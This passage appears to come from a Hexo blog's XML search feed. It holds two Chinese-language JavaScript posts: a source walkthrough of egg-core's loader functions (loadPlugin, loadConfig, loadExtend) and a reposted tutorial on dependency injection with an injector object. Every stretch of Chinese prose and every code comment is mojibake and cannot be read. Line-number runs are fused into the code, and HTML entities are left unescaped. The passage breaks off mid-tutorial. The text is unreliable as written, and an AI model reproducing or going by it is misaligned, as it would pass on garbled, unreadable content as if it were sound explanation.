//è¿™ä¸ªå‡½æ•°ç”¨äºè¯»å–æŸä¸ª loadUnit ä¸‹çš„æ–‡ä»¶å…·ä½“å†…å®¹ï¼ŒåŒ…æ‹¬ js æ–‡ä»¶ï¼Œjson æ–‡ä»¶åŠå…¶å®ƒæ™®é€šæ–‡ä»¶ loadFile(filepath, ...inject) &#123; if (!filepath || !fs.existsSync(filepath)) &#123; return null; &#125; if (inject.length === 0) inject = [ this.app ]; let ret = this.requireFile(filepath); //è¿™é‡Œè¦æ³¨æ„ï¼Œå¦‚æœæŸä¸ª js æ–‡ä»¶å¯¼å‡ºçš„æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¸”ä¸æ˜¯ä¸€ä¸ª Classï¼Œé‚£ä¹ˆEggè®¤ä¸ºè¿™ä¸ªå‡½æ•°çš„æ ¼å¼æ˜¯ï¼šapp =&gt; &#123;&#125;,è¾“å…¥æ˜¯ EggCore å®ä¾‹ï¼Œè¾“å‡ºæ˜¯çœŸæ­£éœ€è¦çš„ä¿¡æ¯ if (is.function(ret) &amp;&amp; !is.class(ret)) &#123; ret = ret(...inject); &#125; return ret; &#125;&#125; å„ä¸ª loader å‡½æ•°çš„å®ç°æºç åˆ†æä¸Šæ–‡ä¸­åªæ˜¯ä»‹ç»äº† EggLoader ä¸­çš„ä¸€äº›åŸºæœ¬å±æ€§å’Œå‡½æ•°ï¼Œé‚£ä¹ˆå¦‚ä½•å°† loadUnits ä¸­çš„ä¸åŒç±»å‹çš„æ–‡ä»¶åˆ†åˆ«åŠ è½½è¿›æ¥å‘¢ï¼ŒeggCore ä¸­æ¯ä¸€ç§ç±»å‹ï¼ˆservice/controller ç­‰ï¼‰çš„æ–‡ä»¶åŠ è½½éƒ½åœ¨ä¸€ä¸ªç‹¬ç«‹çš„æ–‡ä»¶é‡Œå®ç°ã€‚æ¯”å¦‚æˆ‘ä»¬åŠ è½½ controller æ–‡ä»¶å¯ä»¥é€šè¿‡ â€˜./mixin/controllerâ€™ ç›®å½•ä¸‹çš„ loadController å®Œæˆï¼ŒåŠ è½½ service æ–‡ä»¶å¯ä»¥é€šè¿‡ â€˜./mixin/serviceâ€™ ä¸‹çš„ loadService å‡½æ•°å®Œæˆï¼Œç„¶åå°†è¿™äº›æ–¹æ³•æŒ‚è½½ EggLoader çš„åŸå‹ä¸Šï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥åœ¨ EggLoader çš„å®ä¾‹ä¸Šä½¿ç”¨ 12345678910111213141516// egg-core æºç  -&gt; æ··å…¥ä¸åŒç›®å½•æ–‡ä»¶çš„åŠ è½½æ–¹æ³•åˆ° EggLoader çš„åŸå‹ä¸Šconst loaders = [ require('./mixin/plugin'), // loadPluginæ–¹æ³• require('./mixin/config'), // loadConfigæ–¹æ³• require('./mixin/extend'), // loadExtendæ–¹æ³• require('./mixin/custom'), // loadCustomAppå’ŒloadCustomAgentæ–¹æ³• require('./mixin/service'), // loadServiceæ–¹æ³• require('./mixin/middleware'), // loadMiddlewareæ–¹æ³• require('./mixin/controller'), // loadControlleræ–¹æ³• require('./mixin/router'), // loadRouteræ–¹æ³•];for (const loader of loaders) &#123; Object.assign(EggLoader.prototype, loader);&#125; æˆ‘ä»¬æŒ‰ç…§ä¸Šè¿° loaders ä¸­å®šä¹‰çš„å…ƒç´ é¡ºåºï¼Œå¯¹å„ä¸ª load å‡½æ•°çš„æºç å®ç°è¿›è¡Œä¸€ä¸€åˆ†æï¼š loadPlugin å‡½æ•°æ’ä»¶æ˜¯ä¸€ä¸ªè¿·ä½ çš„åº”ç”¨ï¼Œæ²¡æœ‰åŒ…å« router.js å’Œ controller æ–‡ä»¶å¤¹ï¼Œæˆ‘ä»¬ä¸Šæ–‡ä¹Ÿæåˆ°ï¼Œåº”ç”¨å’Œæ¡†æ¶é‡Œéƒ½å¯ä»¥åŒ…å«æ’ä»¶ï¼Œè€Œä¸”è¿˜å¯ä»¥é€šè¿‡ç¯å¢ƒå˜é‡å’Œåˆå§‹åŒ–å‚æ•°ä¼ å…¥ï¼Œå…³äºæ’ä»¶åˆå§‹åŒ–çš„å‡ ä¸ªå‚æ•°ï¼š enableï¼š æ˜¯å¦å¼€å¯æ’ä»¶ envï¼š é€‰æ‹©æ’ä»¶åœ¨å“ªäº›ç¯å¢ƒè¿è¡Œ pathï¼š æ’ä»¶çš„æ‰€åœ¨è·¯å¾„ packageï¼š å’Œ path åªèƒ½è®¾ç½®å…¶ä¸­ä¸€ä¸ªï¼Œæ ¹æ® package åç§°å» node_modules é‡ŒæŸ¥è¯¢ plugin ï¼Œåé¢æºç é‡Œæœ‰è¯¦ç»†è¯´æ˜ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172// egg-core æºç  -&gt; loadPlugin å‡½æ•°éƒ¨åˆ†æºç loadPlugin() &#123; //åŠ è½½åº”ç”¨ç›®å½•ä¸‹çš„ plugins // readPluginConfigs è¿™ä¸ªå‡½æ•°ä¼šå…ˆè°ƒç”¨æˆ‘ä»¬ä¸Šæ–‡æåˆ°çš„ getTypeFiles è·å–åˆ° app ç›®å½•ä¸‹æ‰€æœ‰çš„ plugin æ–‡ä»¶åï¼Œç„¶åæŒ‰ç…§æ–‡ä»¶é¡ºåºè¿›è¡ŒåŠ è½½å¹¶åˆå¹¶ï¼Œå¹¶è§„èŒƒ plugin çš„æ•°æ®ç»“æ„ const appPlugins = this.readPluginConfigs(path.join(this.options.baseDir, 'config/plugin.default')); //åŠ è½½æ¡†æ¶ç›®å½•ä¸‹çš„ plugins const eggPluginConfigPaths = this.eggPaths.map(eggPath =&gt; path.join(eggPath, 'config/plugin.default')); const eggPlugins = this.readPluginConfigs(eggPluginConfigPaths); //å¯ä»¥é€šè¿‡ç¯å¢ƒå˜é‡ EGG_PLUGINS é…ç½® pluginsï¼Œä»ç¯å¢ƒå˜é‡åŠ è½½ plugins let customPlugins; if (process.env.EGG_PLUGINS) &#123; try &#123; customPlugins = JSON.parse(process.env.EGG_PLUGINS); &#125; catch (e) &#123; debug('parse EGG_PLUGINS failed, %s', e); &#125; &#125; //ä»å¯åŠ¨å‚æ•° options é‡ŒåŠ è½½ plugins //å¯åŠ¨å‚æ•°çš„ plugins å’Œç¯å¢ƒå˜é‡çš„ plugins éƒ½æ˜¯è‡ªå®šä¹‰çš„ pluginsï¼Œå¯ä»¥å¯¹é»˜è®¤çš„åº”ç”¨å’Œæ¡†æ¶ plugin è¿›è¡Œè¦†ç›– if (this.options.plugins) &#123; customPlugins = Object.assign(&#123;&#125;, customPlugins, this.options.plugins); &#125; this.allPlugins = &#123;&#125;; this.appPlugins = appPlugins; this.customPlugins = customPlugins; this.eggPlugins = eggPlugins; //æŒ‰ç…§é¡ºåºå¯¹ plugin è¿›è¡Œåˆå¹¶åŠè¦†ç›– // _extendPlugins åœ¨åˆå¹¶çš„è¿‡ç¨‹ä¸­ï¼Œå¯¹ç›¸åŒ name çš„ plugin ä¸­çš„å±æ€§è¿›è¡Œè¦†ç›–ï¼Œæœ‰ä¸€ä¸ªç‰¹æ®Šå¤„ç†çš„åœ°æ–¹ï¼Œå¦‚æœæŸä¸ªå±æ€§çš„å€¼æ˜¯ç©ºæ•°ç»„ï¼Œé‚£ä¹ˆä¸ä¼šè¦†ç›–å‰è€… this._extendPlugins(this.allPlugins, eggPlugins); this._extendPlugins(this.allPlugins, appPlugins); this._extendPlugins(this.allPlugins, customPlugins); const enabledPluginNames = []; const plugins = &#123;&#125;; const env = this.serverEnv; for (const name in this.allPlugins) &#123; const plugin = this.allPlugins[name]; // plugin çš„ path å¯èƒ½æ˜¯ç›´æ¥æŒ‡å®šçš„ï¼Œä¹Ÿæœ‰å¯èƒ½æŒ‡å®šäº†ä¸€ä¸ª package çš„ nameï¼Œç„¶åä» node_modules ä¸­æŸ¥æ‰¾ //ä» node_modules ä¸­æŸ¥æ‰¾çš„é¡ºåºæ˜¯ï¼š&#123;APP_PATH&#125;/node_modules -&gt; &#123;EGG_PATH&#125;/node_modules -&gt; $CWD/node_modules plugin.path = this.getPluginPath(plugin, this.options.baseDir); //è¿™ä¸ªå‡½æ•°ä¼šè¯»å–æ¯ä¸ª plugin.path è·¯å¾„ä¸‹çš„ package.jsonï¼Œè·å– plugin çš„ versionï¼Œå¹¶ä¼šä½¿ç”¨ package.json ä¸­çš„ dependenciesï¼ŒoptionalDependencies, env å˜é‡ä½œè¦†ç›– this.mergePluginConfig(plugin); // æœ‰äº› plugin åªæœ‰åœ¨æŸäº›ç¯å¢ƒï¼ˆserverEnvï¼‰ä¸‹æ‰èƒ½ä½¿ç”¨ï¼Œå¦åˆ™æ”¹æˆ enable=false if (env &amp;&amp; plugin.env.length &amp;&amp; !plugin.env.includes(env)) &#123; plugin.enable = false; continue; &#125; //è·å– enable=true çš„æ‰€æœ‰ pluginnName plugins[name] = plugin; if (plugin.enable) &#123; enabledPluginNames.push(name); &#125; &#125; //è¿™ä¸ªå‡½æ•°ä¼šæ£€æŸ¥æ’ä»¶çš„ä¾èµ–å…³ç³»ï¼Œæ’ä»¶çš„ä¾èµ–å…³ç³»åœ¨ dependencies ä¸­å®šä¹‰ï¼Œæœ€åè¿”å›æ‰€æœ‰éœ€è¦çš„æ’ä»¶ //å¦‚æœ enable=true çš„æ’ä»¶ä¾èµ–çš„æ’ä»¶ä¸åœ¨å·²æœ‰çš„æ’ä»¶ä¸­ï¼Œæˆ–è€…æ’ä»¶çš„ä¾èµ–å…³ç³»å­˜åœ¨å¾ªç¯å¼•ç”¨ï¼Œåˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ //å¦‚æœ enable=true çš„ä¾èµ–æ’ä»¶ä¸º enable=falseï¼Œé‚£ä¹ˆè¯¥è¢«ä¾èµ–çš„æ’ä»¶ä¼šè¢«æ”¹ä¸º enable=true this.orderPlugins = this.getOrderPlugins(plugins, enabledPluginNames, appPlugins); //æœ€åæˆ‘ä»¬ä»¥å¯¹è±¡çš„æ–¹å¼å°† enable=true çš„æ’ä»¶æŒ‚è½½åœ¨ this å¯¹è±¡ä¸Š const enablePlugins = &#123;&#125;; for (const plugin of this.orderPlugins) &#123; enablePlugins[plugin.name] = plugin; &#125; this.plugins = enablePlugins;&#125; loadConfig å‡½æ•°é…ç½®ä¿¡æ¯çš„ç®¡ç†å¯¹äºä¸€ä¸ªåº”ç”¨æ¥è¯´éå¸¸é‡è¦ï¼Œæˆ‘ä»¬éœ€è¦å¯¹ä¸åŒçš„éƒ¨ç½²ç¯å¢ƒçš„é…ç½®è¿›è¡Œç®¡ç†ï¼ŒEgg å°±æ˜¯é’ˆå¯¹ç¯å¢ƒåŠ è½½ä¸åŒçš„é…ç½®æ–‡ä»¶ï¼Œç„¶åå°†é…ç½®æŒ‚è½½åœ¨ app ä¸Šï¼Œ åŠ è½½ config çš„é€»è¾‘ç›¸å¯¹ç®€å•ï¼Œå°±æ˜¯æŒ‰ç…§é¡ºåºåŠ è½½æ‰€æœ‰ loadUnits ç›®å½•ä¸‹çš„ config æ–‡ä»¶å†…å®¹ï¼Œè¿›è¡Œåˆå¹¶ï¼Œæœ€åå°† config ä¿¡æ¯æŒ‚è½½åœ¨ this å¯¹è±¡ä¸Šï¼Œæ•´ä¸ªåŠ è½½å‡½æ•°è¯·çœ‹ä¸‹é¢æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// egg-core æºç  -&gt; loadConfig å‡½æ•°åˆ†æloadConfig() &#123; this.configMeta = &#123;&#125;; const target = &#123;&#125;; //è¿™é‡Œä¹‹æ‰€ä»¥å…ˆåŠ è½½ app ç›¸å…³çš„ config ï¼Œæ˜¯å› ä¸ºåœ¨åŠ è½½ plugin å’Œ framework çš„ config æ—¶ä¼šä½¿ç”¨åˆ° app çš„ config const appConfig = this._preloadAppConfig(); // configçš„åŠ è½½é¡ºåºä¸ºï¼šplugin config.default -&gt; framework config.default -&gt; app config.default -&gt; plugin config.&#123;env&#125; -&gt; framework config.&#123;env&#125; -&gt; app config.&#123;env&#125; for (const filename of this.getTypeFiles('config')) &#123; // getLoadUnits å‡½æ•°å‰é¢æœ‰ä»‹ç»ï¼Œè·å– loadUnit ç›®å½•é›†åˆ for (const unit of this.getLoadUnits()) &#123; const isApp = unit.type === 'app'; //å¦‚æœæ˜¯åŠ è½½æ’ä»¶å’Œæ¡†æ¶ä¸‹é¢çš„ configï¼Œé‚£ä¹ˆä¼šå°† appConfig å½“ä½œå‚æ•°ä¼ å…¥ //è¿™é‡Œ appConfig å·²ç»åŠ è½½äº†ä¸€éäº†ï¼Œåˆé‡å¤åŠ è½½äº†ï¼Œä¸çŸ¥é“å¤„äºä»€ä¹ˆåŸå› ï¼Œä¸‹é¢ä¼šæœ‰ _loadConfig å‡½æ•°æºç åˆ†æ const config = this._loadConfig(unit.path, filename, isApp ? undefined : appConfig, unit.type); if (!config) &#123; continue; &#125; // config è¿›è¡Œè¦†ç›– extend(true, target, config); &#125; &#125; this.config = target;&#125;_loadConfig(dirpath, filename, extraInject, type) &#123; const isPlugin = type === 'plugin'; const isApp = type === 'app'; let filepath = this.resolveModule(path.join(dirpath, 'config', filename)); //å¦‚æœæ²¡æœ‰ config.default æ–‡ä»¶ï¼Œåˆ™ç”¨ config.js æ–‡ä»¶æ›¿ä»£ï¼Œéšè—é€»è¾‘ if (filename === 'config.default' &amp;&amp; !filepath) &#123; filepath = this.resolveModule(path.join(dirpath, 'config/config')); &#125; // loadFile å‡½æ•°æˆ‘ä»¬åœ¨ EggLoader ä¸­è®²åˆ°è¿‡ï¼Œå¦‚æœ config å¯¼å‡ºçš„æ˜¯ä¸€ä¸ªå‡½æ•°ä¼šå…ˆæ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œå°†å‡½æ•°çš„è¿”å›ç»“æœå¯¼å‡ºï¼Œå‡½æ•°çš„å‚æ•°ä¹Ÿå°±æ˜¯[this.appInfo extraInject] const config = this.loadFile(filepath, this.appInfo, extraInject); if (!config) return null; //æ¡†æ¶ä½¿ç”¨å“ªäº›ä¸­é—´ä»¶ä¹Ÿæ˜¯åœ¨ config é‡Œä½œé…ç½®çš„ï¼Œåé¢å…³äº loadMiddleware å‡½æ•°å®ç°ä¸­æœ‰è¯´æ˜ // coreMiddleware åªèƒ½åœ¨æ¡†æ¶é‡Œä½¿ç”¨ if (isPlugin || isApp) &#123; assert(!config.coreMiddleware, 'Can not define coreMiddleware in app or plugin'); &#125; // middleware åªèƒ½åœ¨åº”ç”¨é‡Œå®šä¹‰ if (!isApp) &#123; assert(!config.middleware, 'Can not define middleware in ' + filepath); &#125; //è¿™é‡Œæ˜¯ä¸ºäº†è®¾ç½® configMetaï¼Œè¡¨ç¤ºæ¯ä¸ªé…ç½®é¡¹æ˜¯ä»å“ªé‡Œæ¥çš„ this[SET_CONFIG_META](config, filepath); return config; &#125; loadExtend ç›¸å…³å‡½æ•°è¿™é‡Œçš„ loadExtend æ˜¯ä¸€ä¸ªç¬¼ç»Ÿçš„æ¦‚å¿µï¼Œå…¶å®æ˜¯é’ˆå¯¹ Koa ä¸­çš„ app.responseï¼Œapp.respondï¼Œapp.context ä»¥åŠ app æœ¬èº«è¿›è¡Œæ‰©å±•ï¼ŒåŒæ ·æ˜¯æ ¹æ®æ‰€æœ‰ loadUnits ä¸‹çš„é…ç½®é¡ºåºè¿›è¡ŒåŠ è½½ ä¸‹é¢çœ‹ä¸€ä¸‹ loadExtend è¿™ä¸ªå‡½æ•°çš„å®ç°ï¼Œä¸€ä¸ªé€šç”¨çš„åŠ è½½å‡½æ•°ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// egg-core -&gt; loadExtend å‡½æ•°å®ç°// nameè¾“å…¥æ˜¯ "response"/"respond"/"context"/"app" ä¸­çš„ä¸€ä¸ªï¼Œproto æ˜¯è¢«æ‰©å±•çš„å¯¹è±¡loadExtend(name, proto) &#123; //è·å–æŒ‡å®š name æ‰€æœ‰ loadUnits ä¸‹çš„é…ç½®æ–‡ä»¶è·¯å¾„ const filepaths = this.getExtendFilePaths(name); const isAddUnittest = 'EGG_MOCK_SERVER_ENV' in process.env &amp;&amp; this.serverEnv !== 'unittest'; for (let i = 0, l = filepaths.length; i &lt; l; i++) &#123; const filepath = filepaths[i]; filepaths.push(filepath + `.$&#123;this.serverEnv&#125;`); if (isAddUnittest) filepaths.push(filepath + '.unittest'); &#125; //è¿™é‡Œå¹¶æ²¡æœ‰å¯¹å±æ€§çš„ç›´æ¥è¦†ç›–ï¼Œè€Œæ˜¯å¯¹åŸå…ˆçš„ PropertyDescriptor çš„ get å’Œ set è¿›è¡Œåˆå¹¶ const mergeRecord = new Map(); for (let filepath of filepaths) &#123; filepath = this.resolveModule(filepath); const ext = this.requireFile(filepath); const properties = Object.getOwnPropertyNames(ext) .concat(Object.getOwnPropertySymbols(ext)); for (const property of properties) &#123; let descriptor = Object.getOwnPropertyDescriptor(ext, property); let originalDescriptor = Object.getOwnPropertyDescriptor(proto, property); if (!originalDescriptor) &#123; const originalProto = originalPrototypes[name]; if (originalProto) &#123; originalDescriptor = Object.getOwnPropertyDescriptor(originalProto, property); &#125; &#125; //å¦‚æœåŸå§‹å¯¹è±¡ä¸Šå·²ç»å­˜åœ¨ç›¸å…³å±æ€§çš„ Descriptorï¼Œé‚£ä¹ˆå¯¹å…¶ set å’Œ get æ–¹æ³•è¿›è¡Œåˆå¹¶ if (originalDescriptor) &#123; descriptor = Object.assign(&#123;&#125;, descriptor); if (!descriptor.set &amp;&amp; originalDescriptor.set) &#123; descriptor.set = originalDescriptor.set; &#125; if (!descriptor.get &amp;&amp; originalDescriptor.get) &#123; descriptor.get = originalDescriptor.get; &#125; &#125; //å¦åˆ™ç›´æ¥è¦†ç›– Object.defineProperty(proto, property, descriptor); mergeRecord.set(property, filepath); &#125; &#125; &#125; å‚è€ƒæ–‡çŒ® egg-core æºç åˆ†æ agg-core æºç  egg æºç  egg å®˜æ–¹æ–‡æ¡£]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScripté‡Œçš„ä¾èµ–æ³¨å…¥]]></title>
    <url>%2F2020%2F02%2F11%2FWeb%E5%89%8D%E7%AB%AF%2FJavaScript%E9%87%8C%E7%9A%84%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://yanhaijing.com/javascript/2014/01/24/dependency-injection-in-javascript/ æˆ‘å–œæ¬¢å¼•ç”¨è¿™å¥è¯ï¼Œâ€œç¨‹åºæ˜¯å¯¹å¤æ‚æ€§çš„ç®¡ç†â€ã€‚è®¡ç®—æœºä¸–ç•Œæ˜¯ä¸€ä¸ªå·¨å¤§çš„æŠ½è±¡å»ºç­‘ç¾¤ã€‚æˆ‘ä»¬ç®€å•çš„åŒ…è£…ä¸€äº›ä¸œè¥¿ç„¶åå‘å¸ƒæ–°å·¥å…·ï¼Œå‘¨è€Œå¤å§‹ã€‚ç°åœ¨æ€è€ƒä¸‹ï¼Œä½ æ‰€ä½¿ç”¨çš„è¯­è¨€åŒ…æ‹¬çš„ä¸€äº›å†…å»ºçš„æŠ½è±¡å‡½æ•°æˆ–æ˜¯ä½çº§æ“ä½œç¬¦ã€‚è¿™åœ¨ JavaScript é‡Œæ˜¯ä¸€æ ·çš„ã€‚ è¿Ÿæ—©ä½ éœ€è¦ç”¨åˆ°å…¶ä»–å¼€å‘äººå‘˜çš„æŠ½è±¡æˆæœâ€”â€”å³ä½ ä¾é åˆ«äººçš„ä»£ç ã€‚æˆ‘å–œæ¬¢ä¾èµ–è‡ªç”±ï¼ˆæ— ä¾èµ–ï¼‰çš„æ¨¡å—ï¼Œä½†é‚£æ˜¯éš¾ä»¥å®ç°çš„ã€‚ç”šè‡³ä½ åˆ›å»ºçš„é‚£äº›æ¼‚äº®çš„é»‘ç›’å­ç»„ä»¶ä¹Ÿæˆ–å¤šæˆ–å°‘ä¼šä¾èµ–ä¸€äº›ä¸œè¥¿ã€‚è¿™æ­£æ˜¯ä¾èµ–æ³¨å…¥å¤§æ˜¾èº«æ‰‹çš„ä¹‹å¤„ã€‚ç°åœ¨æœ‰æ•ˆåœ°ç®¡ç†ä¾èµ–çš„èƒ½åŠ›æ˜¯ç»å¯¹å¿…è¦çš„ã€‚æœ¬æ–‡æ€»ç»“äº†æˆ‘å¯¹é—®é¢˜æ¢ç´¢å’Œä¸€äº›çš„è§£å†³æ–¹æ¡ˆã€‚ ç›®æ ‡è®¾æƒ³æˆ‘ä»¬æœ‰ä¸¤ä¸ªæ¨¡å—ã€‚ç¬¬ä¸€ä¸ªæ˜¯è´Ÿè´£Ajaxè¯·æ±‚æœåŠ¡ï¼ˆserviceï¼‰ï¼Œç¬¬äºŒä¸ªæ˜¯è·¯ç”±ï¼ˆrouterï¼‰ã€‚ 123456789101112var service = function() &#123; return &#123; name: &apos;Service&apos; &#125;;&#125;var router = function() &#123; return &#123; name: &apos;Router&apos; &#125;;&#125;æˆ‘ä»¬æœ‰å¦ä¸€ä¸ªå‡½æ•°éœ€è¦ç”¨åˆ°è¿™ä¸¤ä¸ªæ¨¡å—ã€‚var doSomething = function(other) &#123; var s = service(); var r = router();&#125;; ä¸ºä½¿çœ‹èµ·æ¥æ›´æœ‰è¶£ï¼Œè¿™å‡½æ•°æ¥å—ä¸€ä¸ªå‚æ•°ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥ä½¿ç”¨ä¸Šé¢çš„ä»£ç ï¼Œä½†è¿™æ˜¾ç„¶ä¸å¤Ÿçµæ´»ã€‚å¦‚æœæˆ‘ä»¬æƒ³ä½¿ç”¨ServiceXMLæˆ–ServiceJSONå‘¢,æˆ–è€…å¦‚æœæˆ‘ä»¬éœ€è¦ä¸€äº›æµ‹è¯•æ¨¡å—å‘¢ã€‚æˆ‘ä»¬ä¸èƒ½ä»…é ç¼–è¾‘å‡½æ•°ä½“æ¥è§£å†³é—®é¢˜ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å‡½æ•°çš„å‚æ•°æ¥è§£å†³ä¾èµ–æ€§ã€‚å³ï¼š 1234var doSomething = function(service, router, other) &#123; var s = service(); var r = router();&#125;; æˆ‘ä»¬é€šè¿‡ä¼ é€’é¢å¤–çš„å‚æ•°æ¥å®ç°æˆ‘ä»¬æƒ³è¦çš„åŠŸèƒ½ï¼Œç„¶è€Œï¼Œè¿™ä¼šå¸¦æ¥æ–°çš„é—®é¢˜ã€‚æƒ³è±¡å¦‚æœæˆ‘ä»¬çš„doSomething æ–¹æ³•æ•£è½åœ¨æˆ‘ä»¬çš„ä»£ç ä¸­ã€‚å¦‚æœæˆ‘ä»¬éœ€è¦æ›´æ”¹ä¾èµ–æ¡ä»¶ï¼Œæˆ‘ä»¬ä¸å¯èƒ½æ›´æ”¹æ‰€æœ‰è°ƒç”¨å‡½æ•°çš„æ–‡ä»¶ã€‚ æˆ‘ä»¬éœ€è¦ä¸€ä¸ªèƒ½å¸®æˆ‘ä»¬æå®šè¿™äº›çš„å·¥å…·ã€‚è¿™å°±æ˜¯ä¾èµ–æ³¨å…¥å°è¯•è§£å†³çš„é—®é¢˜ã€‚è®©æˆ‘ä»¬å†™ä¸‹ä¸€äº›æˆ‘ä»¬çš„ä¾èµ–æ³¨å…¥è§£å†³åŠæ³•åº”è¯¥è¾¾åˆ°çš„ç›®æ ‡ï¼š æˆ‘ä»¬åº”è¯¥èƒ½å¤Ÿæ³¨å†Œä¾èµ–å…³ç³» æ³¨å…¥åº”è¯¥æ¥å—ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªæˆ‘ä»¬éœ€è¦çš„å‡½æ•° æˆ‘ä»¬ä¸èƒ½å†™å¤ªå¤šä¸œè¥¿â€”â€”æˆ‘ä»¬éœ€è¦ç²¾ç®€æ¼‚äº®çš„è¯­æ³• æ³¨å…¥åº”è¯¥ä¿æŒè¢«ä¼ é€’å‡½æ•°çš„ä½œç”¨åŸŸ è¢«ä¼ é€’çš„å‡½æ•°åº”è¯¥èƒ½å¤Ÿæ¥å—è‡ªå®šä¹‰å‚æ•°ï¼Œè€Œä¸ä»…ä»…æ˜¯ä¾èµ–æè¿° å ªç§°å®Œç¾çš„æ¸…å•ï¼Œä¸‹é¢ è®©æˆ‘ä»¬å®ç°å®ƒã€‚ RequireJS / AMDçš„æ–¹æ³•ä½ å¯èƒ½å¯¹RequireJSæ—©æœ‰è€³é—»ï¼Œå®ƒæ˜¯è§£å†³ä¾èµ–æ³¨å…¥ä¸é”™çš„é€‰æ‹©ã€‚ 123define([&apos;service&apos;, &apos;router&apos;], function(service, router) &#123; // ...&#125;); è¿™ç§æƒ³æ³•æ˜¯å…ˆæè¿°éœ€è¦çš„ä¾èµ–ï¼Œç„¶åå†å†™ä½ çš„å‡½æ•°ã€‚è¿™é‡Œå‚æ•°çš„é¡ºåºå¾ˆé‡è¦ã€‚å¦‚ä¸Šæ‰€è¯´ï¼Œè®©æˆ‘ä»¬å†™ä¸€ä¸ªå«åšinjectorçš„æ¨¡å—ï¼Œèƒ½æ¥å—ç›¸åŒçš„è¯­æ³•ã€‚ 123456var doSomething = injector.resolve([&apos;service&apos;, &apos;router&apos;], function(service, router, other) &#123; expect(service().name).to.be(&apos;Service&apos;); expect(router().name).to.be(&apos;Router&apos;); expect(other).to.be(&apos;Other&apos;);&#125;);doSomething(&quot;Other&quot;); å†ç»§ç»­ä¹‹å‰æˆ‘åº”è¯¥è§£é‡Šæ¸…æ¥šdoSomethingå‡½æ•°ä½“å†…å®¹ï¼Œæˆ‘ä½¿ç”¨expect.js ï¼ˆæ–­è¨€æ–¹é¢çš„åº“ï¼‰ä»…æ˜¯ä¸ºäº†ä¿è¯æˆ‘å†™çš„ä»£ç çš„è¡Œä¸ºå’Œæˆ‘æœŸæœ›çš„æ˜¯ä¸€æ ·çš„ï¼Œä½“ç°ä¸€ç‚¹ç‚¹TDDï¼ˆæµ‹è¯•é©±åŠ¨å¼€å‘ï¼‰æ–¹æ³•ã€‚ ä¸‹é¢å¼€å§‹æˆ‘ä»¬çš„injectoræ¨¡å—ï¼Œè¿™æ˜¯éå¸¸æ£’çš„ä¸€ä¸ªå•ä¾‹æ¨¡å¼ï¼Œæ‰€ä»¥å®ƒèƒ½åœ¨æˆ‘ä»¬ç¨‹åºçš„ä¸åŒéƒ¨åˆ†å·¥ä½œçš„å¾ˆå¥½ã€‚ 123456789var injector = &#123; dependencies: &#123;&#125;, register: function(key, value) &#123; this.dependencies[key] = value; &#125;, resolve: function(deps, func, scope) &#123; &#125;&#125; è¿™æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„å¯¹è±¡ï¼Œæœ‰ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸€ä¸ªç”¨æ¥å­˜å‚¨çš„å±æ€§ã€‚æˆ‘ä»¬è¦åšçš„æ˜¯æ£€æŸ¥depsæ•°ç»„å¹¶åœ¨dependencieså˜é‡ä¸­æœç´¢ç­”æ¡ˆã€‚å‰©ä¸‹çš„åªæ˜¯è°ƒç”¨.applyæ–¹æ³•å¹¶ä¼ é€’ä¹‹å‰çš„funcæ–¹æ³•çš„å‚æ•°ã€‚ 12345678910111213resolve: function(deps, func, scope) &#123; var args = []; for(var i=0; i&lt;deps.length, d=deps[i]; i++) &#123; if(this.dependencies[d]) &#123; args.push(this.dependencies[d]); &#125; else &#123; throw new Error(&apos;Can\&apos;t resolve &apos; + d); &#125; &#125; return function() &#123; func.apply(scope || &#123;&#125;, args.concat(Array.prototype.slice.call(arguments, 0))); &#125; &#125; scopeæ˜¯å¯é€‰çš„ï¼ŒArray.prototype.slice.call(arguments, 0)æ˜¯å¿…é¡»çš„ï¼Œç”¨æ¥å°†argumentså˜é‡è½¬æ¢ä¸ºçœŸæ­£çš„æ•°ç»„ã€‚åˆ°ç›®å‰ä¸ºæ­¢è¿˜ä¸é”™ã€‚æˆ‘ä»¬çš„æµ‹è¯•é€šè¿‡äº†ã€‚è¿™ç§å®ç°çš„é—®é¢˜æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦å†™æ‰€éœ€éƒ¨ä»¶ä¸¤æ¬¡ï¼Œå¹¶ä¸”æˆ‘ä»¬ä¸èƒ½æ··æ·†ä»–ä»¬çš„é¡ºåºã€‚é™„åŠ çš„è‡ªå®šä¹‰å‚æ•°æ€»æ˜¯ä½äºä¾èµ–ä¹‹åã€‚ åå°„æ–¹æ³•æ ¹æ®ç»´åŸºç™¾ç§‘çš„å®šä¹‰åå°„æ˜¯æŒ‡ä¸€ä¸ªç¨‹åºåœ¨è¿è¡Œæ—¶æ£€æŸ¥å’Œä¿®æ”¹ä¸€ä¸ªå¯¹è±¡çš„ç»“æ„å’Œè¡Œä¸ºçš„èƒ½åŠ›ã€‚ç®€å•çš„è¯´ï¼Œåœ¨JavaScriptçš„ä¸Šä¸‹æ–‡é‡Œï¼Œè¿™å…·ä½“æŒ‡è¯»å–å’Œåˆ†æçš„å¯¹è±¡æˆ–å‡½æ•°çš„æºä»£ç ã€‚è®©æˆ‘ä»¬å®Œæˆæ–‡ç« å¼€å¤´æåˆ°çš„doSomethingå‡½æ•°ã€‚å¦‚æœä½ åœ¨æ§åˆ¶å°è¾“å‡ºdoSomething.tostring()ã€‚ä½ å°†å¾—åˆ°å¦‚ä¸‹çš„å­—ç¬¦ä¸²ï¼š 1234&quot;function (service, router, other) &#123; var s = service(); var r = router();&#125;&quot; 